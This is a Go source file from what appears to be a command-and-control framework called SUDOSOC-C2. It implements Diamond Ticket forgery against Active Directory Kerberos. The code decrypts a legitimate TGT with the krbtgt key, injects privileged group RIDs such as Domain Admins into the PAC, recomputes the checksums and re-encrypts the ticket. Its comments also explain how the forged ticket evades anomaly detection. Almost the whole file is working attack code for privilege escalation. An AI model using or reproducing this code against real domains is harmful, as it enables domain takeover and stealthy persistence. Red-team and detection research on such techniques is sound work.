package kerberos

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Diamond Ticket — modify a real TGT in-flight.

	A Diamond Ticket starts with a LEGITIMATE TGT (obtained via normal AS-REQ
	with real credentials) and modifies its PAC to add higher privileges, then
	re-encrypts with the krbtgt key. The result is a ticket that:

	  - Has VALID timestamps (from the real KDC response)
	  - Has VALID nonces and random padding (not all zeros like Golden)
	  - Has the MODIFIED PAC we want (Domain Admins group added)
	  - Is encrypted with the krbtgt key (passes decryption check)

	Why it's harder to detect than Golden:
	  - Ticket timestamps match KDC logs (anomaly detection misses it)
	  - Encryption type matches the domain policy (AES256 if configured)
	  - The ticket structure is derived from a real AS-REP response
	  - Only the PAC contents are modified — everything else is real

	Process:
	  1. Obtain a real TGT via AS-REQ (or extract from LSASS memory)
	  2. Decrypt the ticket with the krbtgt key
	  3. Extract and parse the PAC from AuthorizationData
	  4. Modify the PAC (add group memberships)
	  5. Recompute PAC checksums
	  6. Re-encrypt the modified EncTicketPart
	  7. Inject the modified ticket back
*/

import (
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// DiamondTicketConfig holds parameters for Diamond Ticket modification.
type DiamondTicketConfig struct {
	// Existing real TGT to modify.
	RealTGT []byte
	// Etype of the real TGT (23=RC4, 18=AES256).
	Etype int
	// krbtgt key (matching the ticket etype).
	KrbtgtKey []byte
	// Groups to add (RIDs, e.g. 512 = Domain Admins).
	AddGroups []uint32
	// SIDs to add to SID history.
	AddExtraSIDs [][]byte
	// Override UserID (0 = keep original).
	OverrideUserID uint32
}

// ForgeDiamond modifies a real TGT to add elevated privileges.
func ForgeDiamond(cfg *DiamondTicketConfig) (*ForgedTicket, error) {
	if len(cfg.RealTGT) == 0 {
		return nil, fmt.Errorf("RealTGT required")
	}
	if len(cfg.KrbtgtKey) == 0 {
		return nil, fmt.Errorf("KrbtgtKey required")
	}

	etype := cfg.Etype
	if etype == 0 {
		etype = EtypeRC4HMAC
	}

	// Step 1: Decrypt the ticket's EncTicketPart.
	encData, err := extractEncTicketPart(cfg.RealTGT)
	if err != nil {
		return nil, fmt.Errorf("extract EncTicketPart: %w", err)
	}

	var plaintext []byte
	switch etype {
	case EtypeAES256:
		plaintext, err = AES256CTSDecrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, encData)
	default:
		plaintext, err = RC4HMACDecrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, encData)
	}
	if err != nil {
		return nil, fmt.Errorf("decrypt ticket (check key/etype): %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[diamond] decrypted EncTicketPart: %d bytes", len(plaintext))
	// {{end}}

	// Step 2: Extract PAC from the decrypted EncTicketPart.
	pacBytes, pacOffset, err := extractPACFromEncPart(plaintext)
	if err != nil {
		return nil, fmt.Errorf("extract PAC: %w", err)
	}

	// Step 3: Parse and modify the PAC.
	pac, err := ParsePAC(pacBytes)
	if err != nil {
		return nil, fmt.Errorf("parse PAC: %w", err)
	}

	validationBytes := pac.GetBuffer(PacTypeLogonInfo)
	if validationBytes == nil {
		return nil, fmt.Errorf("KERB_VALIDATION_INFO not found in PAC")
	}

	vi, err := ParseValidationInfo(validationBytes)
	if err != nil {
		return nil, fmt.Errorf("parse ValidationInfo: %w", err)
	}

	// Add the requested groups to the existing group list.
	if len(cfg.AddGroups) > 0 {
		vi = appendGroups(vi, cfg.AddGroups)
	}
	if cfg.OverrideUserID != 0 {
		vi.SetUserID(cfg.OverrideUserID)
		vi.SetPrimaryGroupID(cfg.OverrideUserID)
	}

	pac.SetBuffer(PacTypeLogonInfo, vi.Serialize())

	// Recompute checksums.
	if err := pac.RecomputeChecksums(cfg.KrbtgtKey, cfg.KrbtgtKey, etype); err != nil {
		return nil, fmt.Errorf("PAC checksums: %w", err)
	}
	newPACBytes := pac.Serialize()

	// Step 4: Replace the PAC in the decrypted EncTicketPart.
	newPlaintext := replacePACInEncPart(plaintext, pacOffset, len(pacBytes), newPACBytes)

	// Step 5: Re-encrypt.
	var newEncData []byte
	switch etype {
	case EtypeAES256:
		newEncData, err = AES256CTSEncrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, newPlaintext)
	default:
		newEncData, err = RC4HMACEncrypt(cfg.KrbtgtKey, KeyUsageTicketEncPart, newPlaintext)
	}
	if err != nil {
		return nil, fmt.Errorf("re-encrypt: %w", err)
	}

	// Step 6: Rebuild the TGT with the new encrypted data.
	newTGT := replaceEncTicketPart(cfg.RealTGT, newEncData)

	// {{if .Config.Debug}}
	log.Printf("[diamond] Diamond Ticket forged: %d bytes", len(newTGT))
	// {{end}}

	return &ForgedTicket{
		Raw:   newTGT,
		Etype: etype,
	}, nil
}

// ─── Ticket binary manipulation helpers ───────────────────────────────────

// extractEncTicketPart extracts the encrypted-data bytes from a KRB5 ticket.
// KRB5 tickets are ASN.1-encoded; we do a minimal scan for the cipher field.
func extractEncTicketPart(ticket []byte) ([]byte, error) {
	// Scan for OCTET STRING tag (0x04) near the end of the ticket.
	// The cipher is the last significant field in the Ticket structure.
	for i := len(ticket) - 3; i >= 0; i-- {
		if ticket[i] == 0x04 { // OCTET STRING
			length, dataStart, err := parseASN1Length(ticket, i+1)
			if err != nil {
				continue
			}
			end := dataStart + length
			if end <= len(ticket) && length > 32 {
				return ticket[dataStart:end], nil
			}
		}
	}
	return nil, fmt.Errorf("EncTicketPart cipher not found in ticket")
}

func parseASN1Length(data []byte, off int) (int, int, error) {
	if off >= len(data) {
		return 0, 0, fmt.Errorf("EOF")
	}
	if data[off]&0x80 == 0 {
		return int(data[off]), off + 1, nil
	}
	numBytes := int(data[off] & 0x7F)
	if off+numBytes >= len(data) {
		return 0, 0, fmt.Errorf("length overflow")
	}
	length := 0
	for i := 1; i <= numBytes; i++ {
		length = (length << 8) | int(data[off+i])
	}
	return length, off + numBytes + 1, nil
}

// extractPACFromEncPart finds the PAC within a decrypted EncTicketPart.
// Returns the PAC bytes and the offset within plaintext.
func extractPACFromEncPart(plaintext []byte) ([]byte, int, error) {
	// PAC is wrapped in AuthorizationData entry type 128 (AD-WIN2K-PAC).
	// We scan for the magic PAC header: count(4) + version(4) where count is small.
	for i := 0; i < len(plaintext)-8; i++ {
		count := int(uint32(plaintext[i]) | uint32(plaintext[i+1])<<8 |
			uint32(plaintext[i+2])<<16 | uint32(plaintext[i+3])<<24)
		version := int(uint32(plaintext[i+4]) | uint32(plaintext[i+5])<<8 |
			uint32(plaintext[i+6])<<16 | uint32(plaintext[i+7])<<24)
		if version == 0 && count >= 2 && count <= 16 {
			// Plausible PAC header.
			// Estimate size: header(8) + count*16 + data.
			minSize := 8 + count*16
			if i+minSize <= len(plaintext) {
				return plaintext[i:], i, nil
			}
		}
	}
	return nil, 0, fmt.Errorf("PAC not found in EncTicketPart")
}

// replacePACInEncPart replaces the PAC within the decrypted plaintext.
func replacePACInEncPart(plaintext []byte, pacOff, oldPACLen int, newPAC []byte) []byte {
	result := make([]byte, 0, len(plaintext)-oldPACLen+len(newPAC))
	result = append(result, plaintext[:pacOff]...)
	result = append(result, newPAC...)
	end := pacOff + oldPACLen
	if end < len(plaintext) {
		result = append(result, plaintext[end:]...)
	}
	return result
}

// replaceEncTicketPart replaces the encrypted data in a KRB5 ticket.
func replaceEncTicketPart(ticket, newEncData []byte) []byte {
	// Find the OCTET STRING containing the old cipher and replace it.
	for i := len(ticket) - 3; i >= 0; i-- {
		if ticket[i] == 0x04 {
			length, dataStart, err := parseASN1Length(ticket, i+1)
			if err != nil || length < 32 {
				continue
			}
			end := dataStart + length
			if end <= len(ticket) {
				// Build new ticket with replaced cipher.
				newLengthBytes := encodeASN1Length(len(newEncData))
				result := make([]byte, 0, i+1+len(newLengthBytes)+len(newEncData)+len(ticket[end:]))
				result = append(result, ticket[:i+1]...)
				result = append(result, newLengthBytes...)
				result = append(result, newEncData...)
				result = append(result, ticket[end:]...)
				return result
			}
		}
	}
	return ticket // fallback: return unchanged
}

func encodeASN1Length(length int) []byte {
	if length < 0x80 {
		return []byte{byte(length)}
	}
	if length < 0x100 {
		return []byte{0x81, byte(length)}
	}
	return []byte{0x82, byte(length >> 8), byte(length)}
}

// appendGroups adds group RIDs to a ValidationInfo, modifying the GroupIds array.
func appendGroups(vi *ValidationInfo, addRIDs []uint32) *ValidationInfo {
	if vi.groupCountOff+4 > len(vi.raw) {
		return vi
	}
	curCount := int(uint32(vi.raw[vi.groupCountOff]) |
		uint32(vi.raw[vi.groupCountOff+1])<<8 |
		uint32(vi.raw[vi.groupCountOff+2])<<16 |
		uint32(vi.raw[vi.groupCountOff+3])<<24)
	newCount := curCount + len(addRIDs)

	// Update GroupCount.
	vi.raw[vi.groupCountOff] = byte(newCount)
	vi.raw[vi.groupCountOff+1] = byte(newCount >> 8)
	vi.raw[vi.groupCountOff+2] = byte(newCount >> 16)
	vi.raw[vi.groupCountOff+3] = byte(newCount >> 24)

	// Append new SID_AND_ATTRIBUTES entries (8 bytes each: RID(4) + Attributes(4)).
	for _, rid := range addRIDs {
		entry := make([]byte, 8)
		entry[0] = byte(rid); entry[1] = byte(rid >> 8)
		entry[2] = byte(rid >> 16); entry[3] = byte(rid >> 24)
		entry[4] = 0x07; // SE_GROUP_MANDATORY|ENABLED_BY_DEFAULT|ENABLED
		vi.raw = append(vi.raw, entry...)
	}
	return vi
}
